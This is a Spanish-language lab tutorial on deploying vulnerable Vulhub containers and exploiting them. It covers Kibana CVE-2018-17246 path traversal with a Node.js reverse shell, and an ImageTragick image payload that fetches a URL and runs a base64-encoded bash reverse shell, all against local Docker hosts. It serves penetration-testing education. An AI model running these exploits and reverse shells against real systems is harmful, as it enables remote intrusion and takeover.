# Despliegue de máquinas vulnerables con Docker-Compose

Tags: #Docker #Comandos #Linux 

A continuación, os proporcionamos el enlace al proyecto de Github que estamos usando para esta clase:
-   **Vulhub**: [https://github.com/vulhub/vulhub](https://github.com/vulhub/vulhub)
Asimismo, por aquí os compartimos el enlace al recurso donde se nos ofrece el script en Javascript encargado de establecer la Reverse Shell:
-   **NodeJS Reverse Shell**: [https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell](https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell)

Desplegaremos una maquina Kibana con su vulnerabilidad 
* **Kibana** es una interfaz de usuario gratuita y abierta que permite visualizar los datos de ElasticSearch y navegar en el Elastic Stack
* **Elasticsearch** 
* **Elastic Stack**  

```bash 
❯ svn checkout https://github.com/vulhub/vulhub/trunk/kibana/CVE-2018-17246   # Para clonar una subcarpeta de Github y en donde dice '/tree/master' quitarlo de la url y colocar '/trunk' y el resto de la url
❯ docker-compose up -d                      # Para poder desplegar el contenerdor una vez descargada
❯ docker port cve-2018-17246_kibana_1       # Miramos el puerto que esta usando para ese servicio en especifico
```

Web **localhost:5601** Para poder ver el servicio web de Kibana

```bash 
❯ curl  -s -X GET "\http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../etc/passwd"
	# X -> Es el metodo que queremos tramitar GET
	# s -> modo silence

❯ docker-compose logs                  # Para mirar los logs en Docker pero debes de estar dentro del contenedor 
❯ docker-compose exec kibana bash      # Para ingresar al Kibana
	❯ cd /tmp                         # Este dir tiene privilegios de lectura y escritura
	❯ nvim reverse.js
		(function(){
		    var net = require("net"),
		        cp = require("child_process"),
		        sh = cp.spawn("/bin/sh", []);
		    var client = new net.Socket();
		    client.connect(443, "172.17.0.1", function(){
		        client.pipe(sh.stdin);
		        sh.stdout.pipe(client);
		        sh.stderr.pipe(client);
		    });
		    return /a/; // Prevents the Node.js application form crashing
		})();

# Con este archivo loque hacemos es que vamos a crear una ReverShell por un puerto y nuestra IP (172.17.0.1) pero seria la del 'docker0', despues solo nos pondriamos en escucha por Netcat en el puerto 443
❯ ifconfig docker0          # Miramos la IP de la interface docker0

❯ curl  -s -X GET "\http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../tmp/reverse.js"
❯ nc -nlvp 443              # Para ponernos en escucha por Netcat en espera de la revershell para Linux
```

****

Desplegaremos otra maquina llamada **ImageMagick** con su vulnerabilidad 
-   **Proyecto de Github**: [https://github.com/vulhub/vulhub/tree/master/imagemagick/imagetragick](https://github.com/vulhub/vulhub/tree/master/imagemagick/imagetragick)

Este proyecto se encarga de procesar contenido multimedia 
```bash 
❯ svn checkout https://github.com/vulhub/vulhub/trunk/imagemagick/imagetragick # Para clonar una subcarpeta de Github y en donde dice '/tree/master' quitarlo de la url y colocar **/trunk** y el resto de la url
❯ docker-compose up -d                  # Para poder desplegar el contenerdor una vez descargada
❯ docker port imagetragick_web_1        # Miramos el puerto que esta usando para ese servicio en especifico y nos muestra el 8080
```

Web **localhost:8080** Para poder ver el servicio web de Imagetragick

Podemos usar BurpSuite con otro puerto para poder interceptar la comunicacion y asi en el campo de la extension del archivo a subir, modificarlo y ver que tipo de archivos acepta. Esto se haria con un ataque de fuuerza bruta en el Intruder y con una expresion regular en **Options > Grep-Match** podemos seleccionar **Add** y despues la expresion o el texto que queremos que nos haga match en la respuesta 

Podemos colocar este contenido en el archivo '.jpg' en Burpsuite y poder explotar la vulnerabilidad
```bash 
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg?|curl "172.72.0.1/testingRCE")'
pop graphic-context
```

```bash 
❯ python3 -m http.server 80              # Nos montamos un servidor http 80
```

Ahora podemos hacer la ReverShell 
```bash
❯ nvim file.gif

push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg?`echo tqergqerbash64revershell | base64 -d | bash`"||id " )'
pop graphic-context
```

Después del comando 'echo' colocaremos la ReverShell pero que fue codificada en base 64
```bash
❯ echo -n "/bin/bash -i >& /dev/tcp/172.72.0.1/4646 0>&1" | base64          # Nos regresara la Revershell codificada 
```